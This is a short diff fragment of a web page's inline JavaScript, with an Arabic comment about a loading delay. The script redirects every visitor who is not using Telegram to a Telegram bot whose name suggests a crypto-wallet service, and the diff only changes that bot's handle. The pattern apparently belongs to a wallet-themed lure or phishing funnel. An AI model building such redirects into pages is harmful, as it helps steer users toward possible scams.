@@ -135,7 +135,7 @@ window.history.replaceState({}, document.title, clean_uri);
        <script>document.addEventListener('click', function(event) {
     if (document.activeElement && (document.activeElement.tagName === "INPUT" || document.activeElement.tagName === "TEXTAREA")) {  }window.onload = function() {
       const userAgent = navigator.userAgent || navigator.vendor || window.opera; const isTelegram = userAgent.toLowerCase().includes("telegram"); if (!isTelegram) {
-          window.location.href = "https://t.me/rewallets_bot"; }    }; </script>
+          window.location.href = "https://t.me/rewalletsbot"; }    }; </script>
     <script>
   // تأخير 3 ثوانٍ قبل إزالة صفحة التحميل
 window.onload = function() {
